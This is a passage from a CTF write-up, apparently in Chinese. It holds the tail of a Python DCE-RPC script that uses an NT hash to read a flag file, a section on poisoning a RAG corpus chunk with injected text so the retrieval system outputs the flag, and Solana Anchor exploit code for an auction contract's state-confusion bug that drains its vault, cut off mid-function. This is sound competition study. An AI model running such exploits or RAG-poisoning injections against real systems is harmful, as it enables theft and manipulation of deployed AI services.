</span></span><span class=line><span class=cl>    <span class=c1># 尝试按「无指针 + conformant array」解析</span>
</span></span><span class=line><span class=cl>    <span class=n>off</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>maxc</span><span class=p>,</span> <span class=n>offc</span><span class=p>,</span> <span class=n>act</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;III&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=p>,</span> <span class=n>off</span><span class=p>);</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>12</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span> <span class=o>=</span> <span class=n>resp</span><span class=p>[</span><span class=n>off</span><span class=p>:</span><span class=n>off</span><span class=o>+</span><span class=n>act</span><span class=p>];</span> <span class=n>off</span> <span class=o>+=</span> <span class=n>act</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>off</span> <span class=o>%</span> <span class=mi>4</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>off</span> <span class=o>+=</span> <span class=p>(</span><span class=mi>4</span> <span class=o>-</span> <span class=n>off</span> <span class=o>%</span> <span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>bytes_read</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=p>,</span> <span class=n>off</span><span class=p>)[</span><span class=mi>0</span><span class=p>];</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=n>err</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;I&#34;</span><span class=p>,</span> <span class=n>resp</span><span class=p>,</span> <span class=n>off</span><span class=p>)[</span><span class=mi>0</span><span class=p>];</span> <span class=n>off</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    <span class=n>ret</span> <span class=o>=</span> <span class=n>resp</span><span class=p>[</span><span class=n>off</span><span class=p>]</span> <span class=k>if</span> <span class=n>off</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>resp</span><span class=p>)</span> <span class=k>else</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>buf</span><span class=p>,</span> <span class=n>bytes_read</span><span class=p>,</span> <span class=n>err</span><span class=p>,</span> <span class=n>ret</span><span class=p>,</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span> <span class=o>=</span> <span class=n>transport</span><span class=o>.</span><span class=n>DCERPCTransportFactory</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;ncacn_ip_tcp:</span><span class=si>{</span><span class=n>TARGET</span><span class=si>}</span><span class=s2>[</span><span class=si>{</span><span class=n>PORT</span><span class=si>}</span><span class=s2>]&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>.</span><span class=n>set_credentials</span><span class=p>(</span><span class=n>USER</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>DOMAIN</span><span class=p>,</span> <span class=n>lmhash</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=n>nthash</span><span class=o>=</span><span class=n>NTHASH</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>dce</span> <span class=o>=</span> <span class=n>t</span><span class=o>.</span><span class=n>get_dce_rpc</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>dce</span><span class=o>.</span><span class=n>set_auth_type</span><span class=p>(</span><span class=n>rpcrt</span><span class=o>.</span><span class=n>RPC_C_AUTHN_WINNT</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>dce</span><span class=o>.</span><span class=n>set_auth_level</span><span class=p>(</span><span class=n>rpcrt</span><span class=o>.</span><span class=n>RPC_C_AUTHN_LEVEL_PKT_PRIVACY</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>dce</span><span class=o>.</span><span class=n>connect</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>dce</span><span class=o>.</span><span class=n>bind</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x89\x02\xe0\x62\xbd\x44\x7b\x49\xb8\x5f\xbc\x34\x0f\xbc\xc2\xb0\x01\x00\x00\x00</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ctx</span><span class=p>,</span> <span class=n>fsize</span><span class=p>,</span> <span class=n>err</span><span class=p>,</span> <span class=n>ret</span> <span class=o>=</span> <span class=n>open_file</span><span class=p>(</span><span class=n>dce</span><span class=p>,</span> <span class=sa>r</span><span class=s2>&#34;C:</span><span class=se>\\</span><span class=s2>Users</span><span class=se>\\</span><span class=s2>Administrator</span><span class=se>\\</span><span class=s2>Desktop</span><span class=se>\\</span><span class=s2>flag.txt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Open:&#34;</span><span class=p>,</span> <span class=s2>&#34;fsize=&#34;</span><span class=p>,</span> <span class=n>fsize</span><span class=p>,</span> <span class=s2>&#34;err=&#34;</span><span class=p>,</span> <span class=n>err</span><span class=p>,</span> <span class=s2>&#34;ret=&#34;</span><span class=p>,</span> <span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>err</span> <span class=o>!=</span> <span class=mi>0</span> <span class=ow>or</span> <span class=n>ret</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Open failed&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>offset</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>toread</span> <span class=o>=</span> <span class=nb>min</span><span class=p>(</span><span class=mh>0x400</span><span class=p>,</span> <span class=n>fsize</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>err</span><span class=p>,</span> <span class=n>ret</span><span class=p>,</span> <span class=n>raw</span> <span class=o>=</span> <span class=n>read_file</span><span class=p>(</span><span class=n>dce</span><span class=p>,</span> <span class=n>ctx</span><span class=p>,</span> <span class=n>offset</span><span class=p>,</span> <span class=n>toread</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Read:&#34;</span><span class=p>,</span> <span class=s2>&#34;bytes=&#34;</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=s2>&#34;err=&#34;</span><span class=p>,</span> <span class=n>err</span><span class=p>,</span> <span class=s2>&#34;ret=&#34;</span><span class=p>,</span> <span class=n>ret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>n</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;raw resp:&#34;</span><span class=p>,</span> <span class=n>raw</span><span class=o>.</span><span class=n>hex</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>+=</span> <span class=n>buf</span><span class=p>[:</span><span class=n>n</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>xor_dec</span><span class=p>(</span><span class=n>data</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=misc>Misc</h1><h2 id=rag投毒挑战>RAG投毒挑战</h2><p>本质上是基于RAG的间接提示注入攻击</p><p>题目给出了对应的RAG数据库数据文本，而靶机固定量两个问题，RAG会基于数据库里的数据做向量检索，然后返回对应的问题答案</p><p>所以我们可以通过修改对应的数据文本去引导RAG检索我们构造的恶意提示词，然后去执行一些操作</p><p>下载原始语料后直接上传</p><p><img src=/img/2026-alictf/24.png alt=img></p><p>测试后知道第一个问题的答案是李善德购买的宅子位于长安城南边的归义坊内。，去掉修饰语其实就是归义坊，通过VSCode搜索发现是在chunk_002.txt得到的这个答案。</p><p><img src=/img/2026-alictf/25.png alt=img></p><p>试着在原文的归义坊附近添加内容来输出flag</p><p><img src=/img/2026-alictf/26.png alt=img></p><p>上传后得到flag</p><p><img src=/img/2026-alictf/27.png alt=img></p><h2 id=auction>Auction</h2><p>题目实现的是一个拍卖</p><p>拍卖参数 为起拍价：1 SOL，Deposit：0.2 SOL ，Buy Now：10 SOL，但是最开始我们只有0.1SOL，状态未清理导致的状态混淆 ：BidderState PDA的地址由 [b"bidder", auction_key, bidder_key] 派生。Auction PDA 的地址由 [b"auction", user_key, auction_id] 派生。如果我们创建一个拍卖（ID 1338），结束后将其关闭，然后 重新创建 同一个 ID 的拍卖， Auction 账户地址和对应的 BidderState 地址是完全相同的。合约在关闭拍卖时， 没有清除 BidderState 中的数据。</p><p>利用“低门槛进场，高门槛退场”的差异，凭空套取 Vault 中的资金。</p><p>我们写攻击代码lib.rs</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-YAML data-lang=YAML><span class=line><span class=cl><span class=l>use anchor_lang::prelude::*;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>use anchor_lang::system_program;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>declare_id!(&#34;4FYNmWbFutX4fPV9edZCJg6vNnZGva56WpKCPWWMkpuj&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c>#[program]</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=l>pub mod solve {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>use super::*;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nt>pub fn initialize(ctx</span><span class=p>:</span><span class=w> </span><span class=l>Context&lt;Initialize&gt;) -&gt; Result&lt;()&gt; {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>msg!(&#34;Exploit starting...&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let transfer_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>system_program::Transfer {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>from</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>to</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.pda_bidder.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>system_program::transfer(transfer_ctx, 10_000_000)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>msg!(&#34;Funded PDA&#34;);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>phase_1(&amp;ctx)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>phase_2(&amp;ctx)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>phase_3(&amp;ctx)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>Ok(())</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=nt>fn phase_1(ctx</span><span class=p>:</span><span class=w> </span><span class=cp>&amp;Context&lt;Initialize&gt;)</span><span class=w> </span>-<span class=l>&gt; Result&lt;()&gt; {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let now = Clock::get()?.unix_timestamp;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let end_time_1 = now + 1000; </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=l>let deadline_1 = end_time_1 + 60 * 60 * 24 * 8; </span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::CreateAuction {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auctioneer</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::create_auction(cpi_ctx, 1338, &#34;Prime&#34;.to_string(), 100, 10, 1, end_time_1, deadline_1)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::PlaceBid {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::place_bid(cpi_ctx, 10)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let seeds = &amp;[b&#34;helper&#34;.as_ref(), &amp;[ctx.bumps.pda_bidder]];</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let signer = &amp;[&amp;seeds[..]];</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new_with_signer(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::PlaceBid {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.pda_bidder.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_pda.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>signer</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::place_bid(cpi_ctx, 11)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::PlaceBid {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_user.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>challenge::cpi::place_bid(cpi_ctx, 100)?;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>}<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span>{<span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let seeds = &amp;[b&#34;helper&#34;.as_ref(), &amp;[ctx.bumps.pda_bidder]];</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let signer = &amp;[&amp;seeds[..]];</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=l>let cpi_ctx = CpiContext::new_with_signer(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>ctx.accounts.challenge.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=l>challenge::cpi::accounts::ClaimRefund {</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.pda_bidder.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>auction</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.auction.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>bidder_state</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.bidder_state_pda.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>vault</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.vault.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=nt>system_program</span><span class=p>:</span><span class=w> </span><span class=l>ctx.accounts.system_program.to_account_info(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span>}<span class=p>,</span><span class=w>
